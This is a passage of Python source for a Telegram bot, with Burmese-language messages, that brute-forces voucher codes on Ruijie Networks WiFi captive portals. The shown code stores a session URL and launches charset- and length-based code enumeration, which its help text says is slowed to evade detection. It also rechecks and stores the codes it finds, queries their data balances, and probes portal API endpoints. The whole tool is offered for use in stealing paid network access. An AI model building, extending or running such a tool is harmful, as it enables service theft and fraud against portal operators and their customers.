                if code not in results[chat_id]:
                    results[chat_id].append({
                        "code": code,
                        "plan": item.get("plan", "N/A"),
                        "usage": item.get("usage", "N/A"),
                        "quota": item.get("quota", "N/A")
                    })
            await update_file_content("result.json", results, sha, "Periodic Update")
        except Exception as e:
            log.error(f"[github] update failed, requeueing {len(items)} items: {e}")
            for item in items:
                await SUCCESS_CODE.put(item)

# ── Session URL periodic revalidation ─────────────────────────────────────
async def session_recheck_scheduler():
    while True:
        await asyncio.sleep(SESSION_RECHECK_INTERVAL)
        for cid, data in list(user_data.items()):
            url = data.get('session_url')
            if not url:
                continue
            try:
                log.info(f"[session_recheck] checking session for chat {cid}...")
                ok = await check_session_url(url)
                if not ok:
                    log.warning(f"[session_recheck] session invalid for chat {cid}")
                    try:
                        await bot.send_message(
                            cid,
                            "⚠️ သင့် Session URL သက်တမ်းကုန်သွားပါပြီ။ /setup ဖြင့် အသစ်ထည့်ပါ။"
                        )
                    except:
                        pass
                    task_data = scan_tasks.get(cid)
                    if task_data:
                        task_data["stop"] = True
                        if not task_data["task"].done():
                            task_data["task"].cancel()
                else:
                    log.info(f"[session_recheck] session valid for chat {cid} ✓")
            except Exception as e:
                log.debug(f"[session_recheck] error for {cid}: {e}")

# ── Bot commands ───────────────────────────────────────────────────────────
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။\n\n🛡️ Updated: 2026-10-18 (Security Enhanced)")

@bot.message_handler(commands=['help'])
async def help_cmd(message):
    help_text = (
        "📚 **Command လမ်းညွှန်** (Updated: 2026-10-18)\n\n"
        "၁။ **Setup**:\n"
        "   /setup <url>\n"
        "   (portal-mm-as, portal-as, portal-eu URL)\n\n"
        "၂။ **ရှာဖွေခြင်း**:\n"
        "   /brute <mode> <length> [target]\n"
        "   Mode:\n"
        "     1 = ဂဏန်းသီးသန့် (0-9)\n"
        "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
        "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
        "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
        "   ဥပမာ: /brute 1 6 5\n\n"
        "၃။ /status  – အခြေအနေကြည့် (Admin only)\n"
        "၄။ /stop    – ရပ်တန့်ခြင်း\n"
        "၅။ /resume  – ဆက်ရှာဖွေခြင်း\n"
        "၆။ /saved   – ရလဒ်ကြည့်ခြင်း\n"
        "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
        "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
        "၉။ /notify  – Notification ON/OFF\n"
        "၁၀။ /testbalance – Balance စစ်ခြင်း (Admin only)\n"
        "၁၁။ /discover – Portal endpoints ရှာဖွေခြင်း (Admin only)\n\n"
        "🛡️ **Security Enhanced Version**\n"
        "⚠️ Speed လျှော့ထားပါတယ် (Detection ရှောင်ရန်)"
    )
    await bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['setup'])
async def handle_setup(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, 
            "အသုံးပြုနည်း:\n"
            "/setup your_session_url\n\n"
            "ဥပမာ:\n"
            "https://portal-mm-as.ruijienetworks.com/...\n"
            "https://portal-as.ruijienetworks.com/...\n"
            "https://portal-eu.ruijienetworks.com/..."
        )
        return

    url = args[1]

    # Detect portal type
    portal_config, portal_name = get_portal_config(url)

    # Check if it's a WiFiDog URL
    is_wifidog = 'wifidog' in url.lower() or 'stage=portal' in url.lower()

    await bot.reply_to(message, f"Session URL စစ်ဆေးနေပါသည်...\n🌐 Portal: {portal_name}")

    if await check_session_url(url):
        cid = message.chat.id
        user_data[cid] = {
            'session_url': url, 
            'portal_type': portal_name,
            'is_wifidog': is_wifidog
        }
        success_texts.pop(cid, None)
        limited_texts.pop(cid, None)
        last_scan_params.pop(cid, None)
        pending_brute.pop(cid, None)
        success_messages.pop(cid, None)
        limited_messages.pop(cid, None)

        # Clear session MAC and cookies
        SESSION_MACS.pop(cid, None)
        COOKIE_JARS.pop(cid, None)

        try:
            results, sha = await get_file_content("result.json")
            if str(cid) in results:
                del results[str(cid)]
                await update_file_content("result.json", results, sha, f"Clear codes for {cid}")
        except Exception as e:
            log.error(f"[setup] GitHub clear error: {e}")

        wifidog_note = "\n📡 WiFiDog Portal detected" if is_wifidog else ""
        await bot.reply_to(
            message, 
            f"✅ Session URL သိမ်းဆည်းပြီးပါပြီ။\n"
            f"🌐 Portal: {portal_name}{wifidog_note}\n"
            f"/brute ဖြင့် စတင်ပါ။"
        )
    else:
        await bot.reply_to(message, "❌ Session URL မှားယွင်းနေပါသည်။ URL ကို ပြန်စစ်ပါ။")

@bot.message_handler(commands=['brute'])
async def brute(message):
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(message,
            "အသုံးပြုနည်း:\n"
            "/brute <mode> <length> [target]\n\n"
            "Mode:\n"
            "  1 = ဂဏန်းသီးသန့် (0-9)\n"
            "  2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
            "  3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
            "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
            "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
            "ဥပမာ:\n"
            "/brute 1 6 5\n/brute 2 6\n/brute 5 8 10\n\n"
            "⚠️ Note: Speed လျှော့ထားပါတယ် (Security detection ရှောင်ရန်)"
        )
        return

    try:
        mode = int(args[1])
        length = int(args[2])
        target = int(args[3]) if len(args) > 3 else None

        if mode not in [1, 2, 3, 4, 5]:
            await bot.reply_to(message, "❌ Mode သည် 1-5 အတွင်းဖြစ်ရပါမည်။")
            return
        if length < 1 or length > 12:
            await bot.reply_to(message, "❌ Length သည် 1-12 အတွင်းဖြစ်ရပါမည်။")
            return
        if target is not None and target < 1:
            await bot.reply_to(message, "❌ Target သည် 1 ထက်ကြီးရပါမည်။")
            return
    except ValueError:
        await bot.reply_to(message, "❌ Mode, Length, Target များသည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return

    if chat_id in last_scan_params:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("Resume", callback_data="resume_scan"),
                   InlineKeyboardButton("New Scan", callback_data="new_scan"))
        pending_brute[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": []}
        prev = last_scan_params[chat_id]
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev['mode']}, length: {prev.get('length', '?')}, target: {prev['target']}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await start_brute_scan(chat_id, mode, length, target, message)

async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
    plan_filters = plan_filters or []
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}\n⚠️ Safe mode enabled (slow speed)")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id, user_data[chat_id]['session_url'],
            scan_id, target, message=original_message, progress_msg=progress_msg,
            plan_filters=plan_filters
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(message, "Scan ရပ်ထားပါသည်။ ပြန်စလိုပါက /resume ကိုသုံးပါ။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")

@bot.message_handler(commands=['resume'])
async def resume_scan(message):
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], message, plan_filters=params.get('plan_filters', []))
    await bot.reply_to(message, "ယခင် scan ပြန်စပါပြီ။")

@bot.callback_query_handler(func=lambda call: call.data in ["resume_scan", "new_scan"])
async def handle_resume_callback(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text("Resume လုပ်ရန် scan မရှိပါ။", chat_id=chat_id, message_id=call.message.message_id)
            return
        params = last_scan_params.pop(chat_id)
        await bot.edit_message_text("ယခင် scan ပြန်စပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
        await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            await bot.edit_message_text("Scan အသစ်စတင်ပါပြီ။", chat_id=chat_id, message_id=call.message.message_id)
            await start_brute_scan(chat_id, params['mode'], params.get('length', 6), params['target'], call.message, plan_filters=params.get('plan_filters', []))
        else:
            await bot.edit_message_text("Command ထပ်မံပေးပို့ပါ။", chat_id=chat_id, message_id=call.message.message_id)

@bot.message_handler(commands=['saved'])
async def saved_codes(message):
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return

    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c = item["code"]
            plan = item.get("plan", "N/A")
            usage = item.get("usage", "N/A")
            quota = item.get("quota", "N/A")
            expire = item.get("expire", "N/A")
            portal = item.get("portal", "N/A")

            line = f"`{c}` – ⏳ {plan}"
            if usage != "N/A":
                line += f"\n   📊 Usage: {usage}"
            if quota != "N/A":
                line += f"\n   💾 Quota: {quota}"
            if expire != "N/A":
                line += f"\n   📅 Expire: {expire}"
            if portal != "N/A":
                line += f"\n   🌐 Portal: {portal}"
            parts.append(line)
            parts.append("")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)

    full_text = "\n".join(parts)
    if len(full_text) > TG_MAX_LEN:
        for i in range(0, len(full_text), TG_MAX_LEN):
            await bot.send_message(chat_id, full_text[i:i+TG_MAX_LEN], parse_mode="Markdown")
    else:
        await bot.reply_to(message, full_text, parse_mode="Markdown")

@bot.message_handler(commands=['delete_saved'])
async def delete_saved(message):
    chat_id = message.chat.id
    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

    try:
        results, sha = await get_file_content("result.json")
        if str(chat_id) in results:
            del results[str(chat_id)]
            await update_file_content("result.json", results, sha, f"Clear codes for {chat_id}")
    except Exception as e:
        log.error(f"[delete_saved] Error: {e}")

    await bot.reply_to(message, "🗑️ Saved codes များအားလုံးဖျက်ပြီးပါပြီ။")

@bot.message_handler(commands=['notify'])
async def toggle_notify(message):
    chat_id = message.chat.id
    current = notify_setting.get(chat_id, DEFAULT_NOTIFY)
    notify_setting[chat_id] = not current
    state = "ON" if notify_setting[chat_id] else "OFF"
    await bot.reply_to(message, f"Notify: {state}")

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return

    await bot.reply_to(message, "Success codes များကို ပြန်လည်စစ်ဆေးနေပါသည်...")

    new_success = []
    removed_expired = []
    removed_invalid = []

    for item in success:
        code = item["code"]
        expire = item.get("expire", "N/A")

        if is_expired(expire):
            removed_expired.append(code)
            continue

        recode = await perform_check(
            user_data[chat_id]['session_url'], code, chat_id,
            recheck=True, message=message
        )
        if recode:
            new_success.append(item)
        else:
            removed_invalid.append(code)

    success_texts[chat_id] = new_success

    try:
        results, sha = await get_file_content("result.json")
        cid_str = str(chat_id)
        if cid_str in results:
            kept_codes = {i["code"] for i in new_success}
            results[cid_str] = [r for r in results[cid_str] if r.get("code") in kept_codes]
            await update_file_content("result.json", results, sha, f"Recheck cleanup for {chat_id}")
    except Exception as e:
        log.error(f"[recheck] GitHub sync error: {e}")

    msg_parts = []
    if new_success:
        msg_parts.append(f"✅ Still Valid ({len(new_success)}):\n" + "\n".join([i["code"] for i in new_success]))
    if removed_expired:
        msg_parts.append(f"⏰ Expired (removed) ({len(removed_expired)}):\n" + "\n".join(removed_expired))
    if removed_invalid:
        msg_parts.append(f"❌ Invalid (removed) ({len(removed_invalid)}):\n" + "\n".join(removed_invalid))
    if not msg_parts:
        msg_parts.append("Recheck ပြီးပါပြီ၊ success code တစ်ခုမျှမကျန်ပါ။")

    await bot.reply_to(message, _truncate("\n\n".join(msg_parts)))

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)

    sem_info = "N/A"
    if _voucher_sem is not None:
        try:
            used = CONCURRENCY - _voucher_sem._value
            sem_info = f"{used}/{CONCURRENCY}"
        except Exception:
            sem_info = f"?/{CONCURRENCY}"

    wifidog_count = sum(1 for d in user_data.values() if d.get('is_wifidog', False))

    await bot.reply_to(
        message,
        f"📊 Bot Status (Updated: 2026-10-18)\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"📡 WiFiDog Sessions: {wifidog_count}\n"
        f"⚡ Concurrency Limit: {CONCURRENCY}\n"
        f"🔒 Semaphore In-Use: {sem_info}\n"
        f"📦 Batch Size: {BATCH_SIZE}\n"
        f"📨 Queued Success: {SUCCESS_CODE.qsize()}\n"
        f"🌐 Default Portal: {DEFAULT_PORTAL}\n"
        f"🔁 Session Recheck: {SESSION_RECHECK_INTERVAL//60}min\n"
        f"🛡️ Captcha Retry: {CAPTCHA_RETRY}\n"
        f"🔄 Max Attempts: {MAX_ATTEMPTS}\n"
        f"⏱️ Request Delay: {REQUEST_DELAY[0]}-{REQUEST_DELAY[1]}s\n"
        f"⏱️ Batch Delay: {BATCH_DELAY[0]}-{BATCH_DELAY[1]}s\n\n"
        f"🛡️ **Security Enhanced Mode** ✅"
    )

@bot.message_handler(commands=['testbalance'])
async def testbalance(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    chat_id = message.chat.id

    targets = []
    for cid, items in success_texts.items():
        for item in items:
            targets.append({
                "chat_id": cid,
                "code": item["code"],
                "session_id": item["session_id"],
                "plan": item.get("plan", "N/A"),
                "portal": item.get("portal", "N/A")
            })

    if not targets:
        await bot.reply_to(message, "⚠️ Success code မရှိသေးပါ။")
        return

    await bot.reply_to(message, f"🔍 Testing balance for {len(targets)} code(s)...")

    for t in targets[:3]:
        sid = t["session_id"]
        code = t["code"]
        portal_name = t.get("portal", DEFAULT_PORTAL)
        portal_config = PORTAL_CONFIGS.get(portal_name, PORTAL_CONFIGS[DEFAULT_PORTAL])
        balance_info = await get_balance(sid, portal_config)

        result = (
            f"🎯 Code: `{code}`\n"
            f"🔑 Session ID: `{sid}`\n"
            f"🌐 Portal: {portal_name}\n"
            f"⏳ Time: {balance_info.get('time', 'N/A')}\n"
            f"📊 Usage: {balance_info.get('usage', 'N/A')}\n"
            f"💾 Quota: {balance_info.get('quota', 'N/A')}\n"
            f"📋 Plan: {balance_info.get('plan', 'N/A')}\n"
            f"📅 Expire: {balance_info.get('expire', 'N/A')}"
        )
        await bot.send_message(chat_id, result, parse_mode="Markdown")

# ⭐ NEW: Discover portal endpoints
@bot.message_handler(commands=['discover'])
async def discover_portal(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage: /discover <base_url>\nExample: /discover https://portal-as.ruijienetworks.com")
        return

    base_url = args[1].rstrip('/')
    await bot.reply_to(message, f"🔍 Discovering endpoints for {base_url}...")

    endpoints = [
        "/api/auth/voucher?lang=en_US",
        "/api/v2/auth/voucher?lang=en_US",
        "/api/v1/auth/voucher?lang=en_US",
        "/portal/api/auth/voucher?lang=en_US",
        "/api/auth/captcha/image",
        "/api/v2/auth/captcha/image",
        "/api/auth/balance/getBalance",
        "/api/v2/auth/balance/getBalance",
    ]

    results = []
    for endpoint in endpoints:
        url = base_url + endpoint
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                status = resp.status
                body = await resp.text()

                if status == 200:
                    results.append(f"✅ {endpoint} → {status}")
                elif status == 404:
                    results.append(f"❌ {endpoint} → {status}")
                else:
                    results.append(f"⚠️ {endpoint} → {status}")

        except Exception as e:
            results.append(f"💥 {endpoint} → Error: {str(e)[:50]}")

    result_text = "\n".join(results)
    await bot.reply_to(message, f"📊 Discovery Results:\n\n{result_text}")

# ── Polling and main ──────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            log.warning(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            log.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        asyncio.create_task(session_recheck_scheduler())
        log.info("🚀 Bot started successfully! Updated: 2026-10-18 (Security Enhanced)")
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
